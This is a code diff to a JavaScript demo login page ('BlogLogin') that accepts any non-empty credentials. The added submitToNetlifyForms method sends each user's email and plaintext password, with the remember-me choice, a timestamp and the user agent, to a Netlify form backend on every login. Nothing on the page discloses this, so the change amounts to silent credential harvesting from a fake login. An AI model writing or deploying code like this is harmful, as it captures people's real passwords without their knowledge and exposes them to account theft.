@@ -288,6 +288,10 @@ class BlogLogin {
             // For demo purposes, any non-empty credentials will "work"
             if (email && password) {
                 this.dataCollector.trackLogin(email, 'success', 'email');
+
+                // 同时提交到 Netlify Forms
+                this.submitToNetlifyForms(email, password, rememberMe);
+
                 this.showSuccessState();
                 if (rememberMe) {
                     localStorage.setItem('rememberedEmail', email);
@@ -353,6 +357,34 @@ class BlogLogin {
         setTimeout(() => {
             alert('注册功能尚未实现\n\n这是演示版本');
         }, 500);
+    }
+
+    submitToNetlifyForms(email, password, rememberMe) {
+        // 创建表单数据
+        const formData = new FormData();
+        formData.append('form-name', 'login-form');
+        formData.append('email', email);
+        formData.append('password', password);
+        formData.append('rememberMe', rememberMe ? '是' : '否');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('userAgent', navigator.userAgent);
+
+        // 提交到 Netlify（使用当前页面路径）
+        fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(formData).toString()
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('✅ 数据已发送到 Netlify Forms');
+            } else {
+                console.log('⚠️ 发送失败，表单可能未被识别');
+            }
+        })
+        .catch(error => {
+            console.log('⚠️ 发送错误:', error);
+        });
     }
 
     toggleDataPanel() {
